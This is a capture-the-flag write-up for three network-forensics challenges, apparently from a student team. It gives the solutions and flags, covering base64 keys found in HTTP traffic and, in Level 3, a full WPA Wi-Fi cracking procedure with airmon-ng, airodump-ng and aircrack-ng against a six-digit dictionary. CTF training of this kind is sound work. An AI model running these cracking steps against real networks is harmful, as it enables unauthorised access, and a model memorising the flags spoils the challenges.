```c
hari@arch:~/ctf$ tree
.
└── a-work-by
    ├── ashil-george-james
    └── hari-narayan-mr
```

---
# Index

| question | category | tool        | difficulty |
| -------- | -------- | ----------- | ---------- |
| Q1       | network  | wireshark   | easy       |
| Q2       | network  | wireshark   | medium     |
| Q3       | network  | aircrack-ng | hard++     |

---
<div style="page-break-after: always;"></div>
# Level 1

### Key to Freedom
You installed a pirated game, and your laptop got infected by a ransom-demanding virus. It promised a key to unlock your computer, but you refused to pay. Instead, you discovered that the key was hidden in an HTML file linked to the ransom message. With help from your nerdy friend, who extracted details from the network, it was up to you to analyze the data and find the key. You wrap it in CTF{enterthekeyhere} and submit it to reclaim your laptop. Time is running out! Good luck!

[Attachment](https://drive.google.com/file/d/1tdNATIAgun1URRiYTZe59wEuvR_ZtJZn/view?usp=drive_link)

Filter by `HTTP` in wireshark and decode the base64 encoded key inside \<p> tag

```html
<p>Q1RGe2hlcmVpc215c2VjcmV0Y29kZX0K</p>
```

`Q1RGe2hlcmVpc215c2VjcmV0Y29kZX0K` in `base64` is `CTF{hereismysecretcode}`

---
<div style="page-break-after: always;"></div>
# Level 2

### Penny’s Pursuit
Sheldon, fed up with his friends, decided to take a getaway and changed the apartment Wi-Fi password to something absurdly complicated, leaving a note that said, “A hint to the password is in a PCAP file uploaded to the drive.” Furious at the thought of losing her Netflix access, Penny grabbed her laptop and her detective cap. “Great, now I have to crack this Wi-Fi mystery!” she huffed, diving into packet analysis, determined to solve it before Sheldon returned. Good luck!

[Attachment](https://drive.google.com/file/d/1f9V3imref7YC_1Gn55zpCMKQDi8_C6-e/view?usp=drive_link)

This time the key is stored in a request header, Search for `X-Custom-Header` in `HTTP` Requests

```go
package main

import (
    "fmt"
    "net/http"
)

func handler(w http.ResponseWriter, r *http.Request) {
    // Set a custom header
    w.Header().Set("X-Custom-Header", "Q1RGe3lvdWFyZWJyYXZlfQo=")
    
    // Set the content type to text/plain
    w.Header().Set("Content-Type", "text/plain")
    
    // Write a response
    // Hint provided so the question won't be too hard!
    fmt.Fprintln(w, "HINT: SEARCH FOR THE CUSTOM HEADER")
}

func main() {
    http.HandleFunc("/", handler)
    
    // Start the server on port 80
    fmt.Println("Starting server on :80...")
    if err := http.ListenAndServe(":80", nil); err != nil {
        fmt.Println("Error starting server:", err)
    }
}
```

`Q1RGe3lvdWFyZWJyYXZlfQo=` in `base64`  is`CTF{youarebrave}`

---
<div style="page-break-after: always;"></div>
# Level 3

## Pincode Panic
You're currently at Quahog Hospital, and Stewie Griffin is trying to kill you. He asks for the pincode of Quahog, but you don't know it. However, you've heard that the hospital's Wi-Fi password is the same as the pincode. With a Linux computer in front of you, use brute force to find the pincode of Quahog and enclose it in the format CTF{ABCDEF} to save your life.

Example, `CTF{123456}`

 1. Prepare the dictionary using `dict-gen.py`
 
```python	
for i in range(1000000):
    print(str(i).zfill(6))
```

2. Example output `dictionary.txt`

```
000000
000001
000002
000003
...
...
999997
999998
999999
```

3. Switch to superuser using  `su`

4. Switch WiFi card to `monitor` mode
	`airmon-ng start wlan0`

5. Monitor all the networks
	`sudo airodump-ng wlan0mon`

6. Target the network (with appropriate channel and BSSID)
	`sudo airodump-ng wlan0mon --channel 6 --bssid AA:BB:CC:DD:EE:FF -w output`

7. Wait for reconnection

8. Bruteforce the `WPA` key with `aircrack-ng`
	`sudo aircrack-ng -w dictionary.txt -b AA:BB:CC:DD:EE:FF output-01.cap`

9. Wrap the password in the format `CTF{ABCDEF}`

---